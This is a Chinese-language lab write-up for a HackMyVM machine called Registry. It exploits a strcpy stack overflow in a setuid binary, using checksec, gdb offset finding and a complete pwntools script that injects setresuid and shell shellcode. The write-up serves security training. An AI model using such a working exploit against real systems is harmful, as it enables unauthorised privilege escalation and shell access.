---
title: 'heackmyvmRegistry'
date: 2024-11-07 13:00:00 +0800
categories: [hack,pwn]
tags: []
---
### program

```shell
bamuwe@bamuwe:~$ checksec program
[*] '/program'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

> 保护全关，可以考虑写入shellcode

```c
char *__fastcall vuln(const char *a1)
{
  char dest[128]; // [rsp+10h] [rbp-80h] BYREF

  return strcpy(dest, a1);		//stackoverflow
}
```

> 漏洞函数

```shell
bamuwe@bamuwe:/mnt/c/Users/qianenzhao/Desktop/R$ gdb program
...
pwndbg> set args `cyclic 200`
pwndbg> r
*RIP  0x4011d9 (vuln+47) ◂— ret
____________________________________________________
 ► 0x4011d9 <vuln+47>    ret    <0x6261616b6261616a>
 ...
 bamuwe@bamuwe:~$ cyclic -l 0x6261616b6261616a
136
```

> 确定padding=136

```shell
www-data@registry:/opt/others$ ls -l
ls -l
total 16
-rwsr-xr-x 1 cxdxnt cxdxnt 15976 Jul 24  2023 program
```

思路：

1. 写入`shellcode`，填充到`ret`指令，再调用`call rax`执行`shellcode`

			2. `shellcode`由提升权限`(cxdxnt)`和获取`shell`两部分组成

```python
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.setresuid())+asm(shellcraft.sh())
padding = 136
payload = shellcode.ljust(padding,b'A')+p32(0x401014)
shell = process(['./program',payload])
shell.interactive()
```



